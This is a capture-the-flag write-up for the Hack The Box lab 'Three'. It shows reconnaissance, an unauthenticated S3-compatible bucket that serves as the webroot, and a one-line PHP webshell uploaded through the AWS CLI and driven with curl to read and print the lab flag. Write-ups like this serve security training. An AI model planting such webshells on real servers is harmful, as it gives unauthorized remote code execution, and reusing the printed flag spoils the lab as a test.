# HTB Lab: Three — Writeup

**Author:** Obito Uchiha — Team AKATSUKI
**Target:** `10.129.165.39`
**Difficulty:** Very Easy

---

## 1. Reconnaissance

### Full TCP Port Scan
```
nmap -sS -p- --min-rate 2000 10.129.165.39 -vv -oN allPorts.txt
```
**Result:**
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

### Service/Version Detection
```
nmap -sC -sV -O -p22,80 -T4 10.129.165.39 -vv -oN servicesVersions.txt
```
**Result:**
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Two open TCP ports: **22 (SSH)** and **80 (HTTP)**.

---

## 2. Web Enumeration

```
curl -i http://10.129.165.39:80/
```

Response: `HTTP/1.1 200 OK` — site titled **"The Toppers"**.

The "Contact" section of the site revealed the email domain **`thetoppers.htb`**.

### Directory Fuzzing
```
ffuf -u http://10.129.165.39:80/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

### Host Resolution
No DNS server is available on the network, so hostname → IP mapping was done locally via `/etc/hosts`:

```
sudo nano /etc/hosts
10.129.165.39  thetoppers.htb
```

Further enumeration uncovered a subdomain: **`s3.thetoppers.htb`**, added to `/etc/hosts` as well.

---

## 3. Subdomain Analysis — Fake S3 Service

Probing `s3.thetoppers.htb` revealed it was running an **Amazon S3-compatible service**, manageable via the AWS CLI (`awscli`).

### Configuring AWS CLI
```
aws configure
AWS Access Key ID: test
AWS Secret Access Key: test
Default region name: us-east-1
Default output format: json
```
(Any dummy credentials work since this is an unauthenticated/misconfigured S3-compatible endpoint.)

### Listing Buckets
```
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
```
**Result:**
```
2026-11-03 23:30:28 thetoppers.htb
```

### Listing Bucket Contents
```
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
**Result:**
```
                           PRE images/
2026-11-03 23:30:28          0 .htaccess
2026-11-03 23:30:28      11952 index.php
2026-11-04 00:12:32         30 shell.php
```

This bucket is the **live webroot** of the site at port 80. The server runs **PHP**, confirmed by the presence of `index.php`.

---

## 4. Exploitation — Arbitrary File Upload to Webroot

Since the S3 bucket **is** the webserver's document root, any file uploaded to the bucket becomes instantly accessible over HTTP.

### Webshell
```php
<?php system($_GET['cmd']); ?>
```

### Uploading via AWS CLI
```
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

### Confirming Code Execution
```
curl 'http://10.129.165.39/shell.php?cmd=id'
```
**Result:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote Code Execution achieved as `www-data`.

---

## 5. Flag Capture

```
curl 'http://10.129.165.39/shell.php?cmd=ls%20..'
```
```
flag.txt
html
```

```
curl 'http://10.129.165.39/shell.php?cmd=cat%20../flag.txt'
```

**Flag:**
```
a980d99281a28d638ac68b9bf9453c2b
```

---

## 6. Summary

| Step | Technique |
|---|---|
| Recon | `nmap` full port + service scan |
| Discovery | Virtual host → `thetoppers.htb`, subdomain → `s3.thetoppers.htb` |
| Service ID | Fake Amazon S3 endpoint, controllable via `awscli` |
| Misconfiguration | S3 bucket = live webroot, no auth enforced |
| Exploit | Uploaded `shell.php` webshell directly into the bucket |
| Impact | RCE as `www-data` → flag read from `/var/www/flag.txt` |

**Root cause:** The S3-compatible storage backend was mounted as the Apache document root with no access control, and accepted dummy/unauthenticated AWS credentials — allowing arbitrary file upload (effectively CVE-2017-15715-class impact: unauthenticated arbitrary file upload leading to RCE).

---
*— Obito Uchiha, Team AKATSUKI*
